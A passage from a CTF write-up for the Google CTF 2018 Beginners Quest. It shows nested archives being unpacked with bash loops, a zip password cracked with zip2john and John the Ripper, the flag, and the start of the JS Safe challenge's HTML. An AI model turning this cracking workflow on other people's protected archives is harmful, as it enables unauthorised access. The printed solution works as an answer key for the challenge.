  inflating: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b  
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.zip
  inflating: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a  
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.zip
 extracting: password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a

root@kali:~/google-ctf-2018/security-by-obscurity# ls
nested-unzipper  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a

root@kali:~/google-ctf-2018/security-by-obscurity# file *
nested-unzipper:                                                                                            Bourne-Again shell script, ASCII text executable
password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a: XZ compressed data
```

Instead, we now find nested XZ compressed files. 

```bash
root@kali:~/google-ctf-2018/security-by-obscurity# mv password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.xz

root@kali:~/google-ctf-2018/security-by-obscurity# unxz password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.xz

root@kali:~/google-ctf-2018/security-by-obscurity# ls -la password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a 
-rw-r--r-- 1 root root 7168 Jun 14  2018 password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a

root@kali:~/google-ctf-2018/security-by-obscurity# file password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a 
password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a: XZ compressed data
```

<b>nested-unxzer</b>
```bash
#!/bin/bash

while [ "`file * | grep "XZ compressed"`" ]; do
    for file in `file * | grep "XZ compressed" | cut -d ':' -f1`; do
        mv $file $file.xz
        echo "Decompressing $file.xz"
        unxz $file.xz
    done    
done
```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/34.png" alt="" class="center">
<br>
<br>
```bash
root@kali:~/google-ctf-2018/security-by-obscurity# ./nested-unxzer
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.xz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.xz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.xz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.xz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.xz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.xz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.xz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.xz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.xz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.xz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.xz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.xz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.xz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.xz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.xz

root@kali:~/google-ctf-2018/security-by-obscurity# ls
nested-unxzer  nested-unzipper  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a

root@kali:~/google-ctf-2018/security-by-obscurity# file password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a 
password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a: bzip2 compressed data, block size = 900k
```

Our next roadblock involves bzip2 data.

```bash
root@kali:~/google-ctf-2018/security-by-obscurity# mv password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.bz2

root@kali:~/google-ctf-2018/security-by-obscurity# bzip2 -d password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.bz2

root@kali:~/google-ctf-2018/security-by-obscurity# ls 
nested-unxzer  nested-unzipper  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a

root@kali:~/google-ctf-2018/security-by-obscurity# file password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a 
password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a: bzip2 compressed data, block size = 900k
```

<b>nested-bz2er</b>
```bash
#!/bin/bash

while [ "`file * | grep "bzip2 compressed"`" ]; do
    for file in `file * | grep "bzip2 compressed" | cut -d ':' -f1`; do
        mv $file $file.bz2
        echo "Decompressing $file.bz2"
        bzip2 -d $file.bz2
    done    
done
```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/33.png" alt="" class="center">
<br>
<br>
```bash
root@kali:~/google-ctf-2018/security-by-obscurity# ./nested-bz2er 
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.bz2
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.bz2
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.bz2
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.bz2
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.bz2
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.bz2
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.bz2
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.bz2
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.bz2
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.bz2
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.bz2
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.bz2
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.bz2
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.bz2
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.bz2
```

Lo and behold, more compressed data. This time, gzip.

```bash
root@kali:~/google-ctf-2018/security-by-obscurity# ls
nested-bz2er  nested-unxzer  nested-unzipper  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a

root@kali:~/google-ctf-2018/security-by-obscurity# file password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a

password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a: gzip compressed data, last modified: Thu Jun 14 11:53:22 2018, from Unix

root@kali:~/google-ctf-2018/security-by-obscurity# mv password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.gz
root@kali:~/google-ctf-2018/security-by-obscurity# gzip -d password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.gz

root@kali:~/google-ctf-2018/security-by-obscurity# ls
nested-bz2er  nested-unxzer  nested-unzipper  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a

root@kali:~/google-ctf-2018/security-by-obscurity# file password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a 
password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a: gzip compressed data, last modified: Thu Jun 14 11:53:22 2018, from Unix
```

<b>nested-gzipper</b>
```bash
#!/bin/bash

while [ "`file * | grep "gzip compressed"`" ]; do
    for file in `file * | grep "gzip compressed" | cut -d ':' -f1`; do
        mv $file $file.gz
        echo "Decompressing $file.gz"
        gzip -d $file.gz
    done    
done
```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/33.png" alt="" class="center">
<br>
<br>
```bash
root@kali:~/google-ctf-2018/security-by-obscurity# ./nested-gzipper 
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.gz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.gz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.gz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.gz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.gz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.gz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.gz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.gz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.gz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.gz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.gz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.gz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.gz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.gz
Decompressing password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.gz
```

It seems we've encountered another regular zip file. If we're quick to use our <b>nested-unzipper</b> script, we discover that the file is actually password protected. Unfortunately, our script deletes the zip files that it unzips, so it's probably not a good idea to hastily run our script...

```bash
root@kali:~/google-ctf-2018/security-by-obscurity# ls 
nested-bz2er  nested-gzipper  nested-unxzer  nested-unzipper  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a

root@kali:~/google-ctf-2018/security-by-obscurity# file password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a 
password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a: Zip archive data, at least v1.0 to extract

root@kali:~/google-ctf-2018/security-by-obscurity# ./nested-unzipper 
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip
[password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip] password.txt password: 
password incorrect--reenter

root@kali:~/google-ctf-2018/security-by-obscurity# ls 
nested-bz2er  nested-gzipper  nested-unxzer  nested-unzipper
```

After running <b>nested-unzipper</b>, the password-protected file would have been deleted. If we had manually investigated the file beforehand, we would have gotten the output below and retained our password-protected archive.

```bash
root@kali:~/google-ctf-2018/security-by-obscurity# file password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a 
password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a: Zip archive data, at least v1.0 to extract

root@kali:~/google-ctf-2018/security-by-obscurity# mv password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip

root@kali:~/google-ctf-2018/security-by-obscurity# unzip password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip 
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip
[password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip] password.txt password: 
   skipping: password.txt            incorrect password

root@kali:~/google-ctf-2018/security-by-obscurity# ls 
nested-bz2er  nested-gzipper  nested-unxzer  nested-unzipper  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip
```

We can run <code>zip2john</code> to generate a hash for our zip archive and then run the hash through <code>john</code> to test hashes.

```bash
root@kali:~/google-ctf-2018/security-by-obscurity# /opt/JohnTheRipper/run/zip2john password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip > password.hash
ver 1.0 efh 5455 efh 7875 password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip/password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=44, decmplen=32, crc=4341BA5D

root@kali:~/google-ctf-2018/security-by-obscurity# cat password.hash
password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip/password.txt:$pkzip2$1*2*2*0*2c*20*4341ba5d*0*46*0*2c*4341*6eab*327fdc864aefd7fd5a7462f9355e15e84fc09d4e7d3a5ecd1318f77f7f6f2c86b62edc0a6d7eb87cba92a613*$/pkzip2$:password.txt:password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip::password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip
```

```
root@kali:~/google-ctf-2018/security-by-obscurity# /opt/JohnTheRipper/run/zip2john password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip > password.hash
ver 1.0 efh 5455 efh 7875 password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip/password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=44, decmplen=32, crc=4341BA5D
root@kali:~/google-ctf-2018/security-by-obscurity# /opt/JohnTheRipper/run/john password.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/32])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 4 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 3 candidates buffered for the current salt, minimum 8
needed for performance.
Warning: Only 5 candidates buffered for the current salt, minimum 8
needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any
Proceeding with wordlist:/opt/JohnTheRipper/run/password.lst, rules:Wordlist
asdf             (password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip/password.txt)
1g 0:00:00:00 DONE 2/3 (2019-01-08 17:47) 8.333g/s 420391p/s 420391c/s 420391C/s 123456..ferrises
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```


<code>john</code> discovers the password as <b>asdf</b>. Within the password-protected zip archive is the flag.

```bash
root@kali:~/google-ctf-2018/security-by-obscurity# unzip password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip 
Archive:  password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip
[password.x.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.zip] password.txt password: 
 extracting: password.txt            

root@kali:~/google-ctf-2018/security-by-obscurity# cat password.txt
CTF{CompressionIsNotEncryption}
```

<br>
<br>
### Solution
<b>CTF{CompressionIsNotEncryption}</b>

<br>
<br>
## JS Safe - web

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/37.png" alt="" class="center">
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/38.png" alt="" class="center">

For this challenge, we're investigating some file that we found in the driver for a password storage device. As it turns out, the file is an html document which we can open up in a browser.

```bash
root@kali:~/google-ctf-2018/js-safe# unzip 7a50da3856dc766fc167a3a9395e86bdcecabefc1f67c53f0b5d4a660f17cd50.zip 
Archive:  7a50da3856dc766fc167a3a9395e86bdcecabefc1f67c53f0b5d4a660f17cd50.zip
 extracting: js_safe_1.html

root@kali:~/google-ctf-2018/js-safe# file js_safe_1.html 
js_safe_1.html: HTML document, UTF-8 Unicode text, with very long lines

root@kali:~/google-ctf-2018/js-safe# firefox js_safe_1.html
```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/39.png" alt="" class="center">
<br>
<br>
Entering the incorrect password in the password field returns an "Access Denied" message.
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/40.png" alt="" class="center">
<br>
<br>
Let's check out what the html file contains.

```html
root@kali:~/google-ctf-2018/js-safe# cat js_safe_1.html 
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>JS Safe - the leading localStorage based safe solution with advanced obfuscation technology</title>
<!--
Advertisement:
Looking for a hand-crafted, browser based virtual safe to store your most
interesting secrets? Look no further, you have found it. You can order your own
by sending a mail to js_safe@example.com. When ordering, please specify the
password you'd like to use to open and close the safe and the content you'd
like to store. We'll hand craft a unique safe just for you, that only works
with your password of choice and contains your secret. (We promise we won't
peek when handling your data.)
-->
<style>
body {
  text-align: center;
}
input {
  font-size: 200%;
  margin-top: 5em;
  text-align: center;
  width: 26em;
}
#result {
  margin-top: 8em;
  font-size: 300%;
  font-family: monospace;
  font-weight: bold;
}
body.granted>#result::before {
  content: "Access Granted";
  color: green;
}
body.denied>#result::before {
  content: "Access Denied";
  color: red;
}
#content {
  display: none;
}
body.granted #content {
  display: initial;
}
.wrap {
  display: inline-block;
  margin-top: 50px;
  perspective: 800px;
  perspective-origin: 50% 100px;
}
.cube {
  position: relative;
  width: 200px;
  transform-style: preserve-3d;
}
.back {
  transform: translateZ(-100px) rotateY(180deg);
}
.right {
  transform: rotateY(-270deg) translateX(100px);
  transform-origin: top right;
}
.left {
